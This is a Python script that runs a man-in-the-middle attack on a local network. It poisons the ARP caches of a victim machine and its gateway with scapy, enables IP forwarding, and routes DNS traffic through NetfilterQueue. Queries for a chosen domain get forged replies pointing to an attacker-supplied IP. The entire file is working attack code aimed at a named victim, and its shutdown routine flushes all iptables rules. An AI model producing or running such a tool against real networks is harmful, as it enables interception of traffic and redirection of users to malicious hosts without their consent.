#!/usr/bin/env python

#1. Imports:

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
import time
import threading
import os

try:
	from scapy.all import *
except ImportError:
	print("[!]Install scapy to use this module.")
	exit()
	
try:
	from netfilterqueue import NetfilterQueue
except ImportError:
	print("[!]Install NetfilterQueue to use this module.")
	exit()
	
#2. Variables:

global victimIP, victimMAC, gatewayIP, gatewayMAC, spoofDomain, spoofIP

victimIP = sys.argv[1]
gatewayIP = sys.argv[2]
spoofDomain = sys.argv[3]
spoofIP = sys.argv[4]

#3. Functions for ARP spoofing:

def getMAC(ip): #Get MAC address using ARP.
	ans, unans = sr(ARP(pdst=ip), timeout=1, retry=0, verbose=0)
	for s, r in ans:
		return r[ARP].hwsrc
		
gatewayMAC = getMAC(gatewayIP)
victimMAC = getMAC(victimIP)

try:
	print("[*]Gateway MAC: "+gatewayMAC)
	print("[*]Victim MAC: "+victimMAC)
except:
	print("[!]Error getting MAC address.")
	exit()
		
def poison():#Poison the targets.
	global victimIP, gatewayIP, victimMAC, gatewayMAC
	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC), verbose=0)
	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC), verbose=0)
	
def restore():#Restore ARP tables.
	global victimIP, gatewayIP, victimMAC, gatewayMAC
	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=3, verbose=0)
	
#4. Functions for DNS spoofing:

def modify(packet):
	global spoofDomain, spoofIP
	pkt = IP(packet.get_payload())
	if not pkt.haslayer(DNSQR):
		packet.accept()#Accept if packet is not a DNS query.
	else:#
		if spoofDomain in pkt[DNS].qd.qname:#Modify packet if it matches spoofDomain.
			spoofed_pkt = IP(dst=pkt[IP].src, src =pkt[IP].dst)/\
				UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
				DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
				an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofIP))
			packet.set_payload(str(spoofed_pkt))
			packet.accept()#Make the packet appear legit and sling it back to the victim.
			print("[*]Spoofed request for "+str(pkt[DNS].qd.qname))
		else:
			packet.accept()#Accept if query doesn't match spoofDomain.
		
def listen():
	nfqueue = NetfilterQueue()
	nfqueue.bind(1, modify)#Set up NetfilterQueue
	nfqueue.run()
	
#5. Functions for setting up iptables and such:

def start_iptables():
	with open("/proc/sys/net/ipv4/ip_forward", "w") as ipf:
		ipf.write("1\n")
		ipf.close()
	os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1")
	
def stop_iptables():
	with open("/proc/sys/net/ipv4/ip_forward", "w") as ipf:
		ipf.write("0\n")
		ipf.close()
	os.system("iptables -F")
	os.system("iptables -X")
	os.system("iptables -t nat -F")
	os.system("iptables -t nat -X")
	
#6. Main function:

def main():
	t = threading.Thread(target=listen)
	t.daemon = True
	t.start()
	start_iptables()
	print("[*]Starting...")
	while 1:
		try:
			poison()
			time.sleep(1.5)
		except KeyboardInterrupt:
			print("[*]User requested shutdown.")
			stop_iptables()
			restore()
			exit()
			
#7. And here we go!

if __name__ == "__main__":
	main()
